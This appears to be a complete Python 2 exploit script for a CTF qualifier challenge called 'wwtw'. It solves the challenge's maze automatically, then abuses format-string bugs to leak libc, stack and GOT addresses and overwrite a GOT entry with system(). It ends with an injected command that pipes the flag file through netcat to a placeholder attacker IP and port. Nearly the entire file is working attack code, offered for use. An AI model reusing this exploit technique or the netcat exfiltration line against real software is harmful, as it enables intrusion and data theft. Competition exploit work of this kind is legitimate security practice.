#!/usr/bin/python2 -u

"""
Run this with:
while python2 wwtw.py 1; do :; done
"""

import os
import socket
import struct
import subprocess
import time
import sys
import binascii

# Toggle subprocess/socket
remote = len(sys.argv)==2

def readuntil(needle, printAll=False, draw=False):
	data = ""
	while needle not in data:
		if remote:
			r = conn.recv(1)
			data += r
			if len(r) == 0:
				exit(0)
		else:
			global p
			r = p.stdout.read(1)
			if len(r) == 0:
				exit(0)
			data += r
		if printAll:
			print data[-1],
		if draw:
			os.write(1,data[-1])
	return data

# Who needs subsock
if remote:
	conn = socket.socket()
	conn.connect(('wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me', 2606))
	send = conn.send
else:
	p = subprocess.Popen(
			#['ltrace', '-i', '-s', '1042', './wwtw'],
			['strace', '-i', '-s', '1042', './wwtw'],
			#['./wwtw'],
			stdout=subprocess.PIPE,
			stdin=subprocess.PIPE,
			universal_newlines=True)
	send = p.stdin.write


lastRoom = False
while True:
	readuntil("012345678901234567890\n")
	m = map(lambda x:x[2:], readuntil("Your move (w,a,s,d,q): ").split("\n")[:-1])
	youLoc = None
	exitLoc = None
	for row in range(len(m)):
		if youLoc and exitLoc:
			break
		for you in "^V<>":
			if you in m[row]:
				youLoc = (row, m[row].index(you))
		for ex in "ET":
			if ex in m[row]:
				exitLoc = (row, m[row].index(ex))
				if ex == "T":
					lastRoom = True
	if youLoc[1] < exitLoc[1]:
		cmd = "d"
	elif youLoc[1] > exitLoc[1]:
		cmd = "a"
	elif youLoc[0] < exitLoc[0]:
		cmd = "s"
	elif youLoc[0] > exitLoc[0]:
		cmd = "w"
	if lastRoom and \
			(abs(youLoc[1] - exitLoc[1]) + abs(youLoc[0] - exitLoc[0]) == 1):
		send(cmd + "\n")
		break

	send(cmd + "\n")
print "solved puzzle"
print readuntil(": ")
send("UeSlhCAGEp\n")
print readuntil("Selection:")
send("1"*8 + "\x00")
print "sleeping 2"
if remote:
	time.sleep(3)
else:
	time.sleep(2)
send(struct.pack("<I", 1431907181))
print readuntil("Selection:")
send("1\n")
print readuntil("Selection:")
send("3\n")

print readuntil("Coordinates: ")



send("51.492137, -0.192878" + "%160$p." + "\n")
readuntil("51.492137, -0.192878")
readuntil("51.492137, -0.192878")
leak = readuntil(" is occupied")[:-len(" is occupied")]
print "leak", leak
leakAddr = int(leak.split('.')[-2], 16)
leakAddr+=0x33279+0x8f
system = leakAddr
print "Libc leak: ",hex(leakAddr)
readuntil("Coordinates: ")

send("51.492137, -0.192878" + "%9$p." + "\n")
readuntil("51.492137, -0.192878")
readuntil("51.492137, -0.192878")
leak = readuntil(" is occupied")[:-len(" is occupied")]
print "leak", leak
leakAddr = int(leak.split('.')[-2], 16)
leakAddr-=0x100+100-4*4-2
stack = leakAddr
print "Stack leak",hex(leakAddr)


send("51.492137, -0.192878____" + struct.pack("<I", stack) + "%21$s" + "\n")
readuntil("51.492137, -0.192878")
readuntil("51.492137, -0.192878____")
leak = readuntil(" is occupied")[:-len(" is occupied")]
print "leak", leak[4:8].encode("hex")

leakAddr = struct.unpack("<I",leak[4:8])[0]
leakAddr+=0x200f+0x48

gotAddr = leakAddr
print "Got leak",hex(leakAddr)

print hex(system&0xf000)
print hex(system&0xf000+0x190)

count1 = 0x90-len("51.492137, -0.192878____")-8

count2 = (system&0xffff00)>>8
count2 = count2-count1-len("51.492137, -0.192878____")-8

print "Count ",count1,count2
send("51.492137, -0.192878____" + struct.pack("<II", gotAddr, gotAddr+1)+"%0"+str(count1)+"x" + "%21$hhn" +"%0"+str(count2)+"x"+"%22$hn"+ "\n")
readuntil("51.492137, -0.192878")
readuntil("51.492137, -0.192878____")
leak = readuntil(" is occupied")[:-len(" is occupied")]
print leak[:100]

print "Stack leak",hex(stack)
print "Got leak",hex(gotAddr)
print "Libc leak: ",hex(system)
print hex(system&0xf000)

print "Sending"
data = ''
leakAddr = gotAddr
send("51.492137, -0.192878;cat /home/wwtw/flag | nc <YOUR IP> <YOUR PORT>\n")
print "done?"
exit(1)
